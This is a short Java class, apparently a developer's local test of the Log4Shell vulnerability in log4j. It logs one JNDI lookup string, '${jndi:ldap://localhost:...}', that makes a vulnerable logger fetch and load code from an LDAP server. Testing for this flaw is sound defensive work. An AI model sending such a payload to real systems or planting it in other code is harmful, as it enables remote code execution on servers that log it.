package com.notsay.user.web.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import sun.applet.Main;

/**
 * @description:
 * @author: dsy
 * @date: 2021/12/10 16:07
 */
public class log4j {

    private static Logger LOG= LogManager.getLogger(Main.class);
    public static void main(String[] args) {
        LOG.error("${jndi:ldap://localhost:9999/api/v1/test/test1}");
    }
}